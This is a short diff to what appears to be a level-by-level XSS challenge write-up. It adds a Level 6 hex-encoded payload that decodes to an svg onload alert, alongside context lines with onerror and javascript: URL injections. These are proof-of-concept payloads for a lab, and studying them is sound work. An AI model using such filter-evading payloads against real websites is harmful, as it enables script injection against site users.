@@ -35,9 +35,15 @@ x' onerror=javascript:alert()//
 
 ```html
 XSS&action=javascript:alert(1337)
-``
+```
 
 ## Level 6
+
+- Hex encodin \x
+
+```
+\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x29
+```
 
 ## Level 7
 
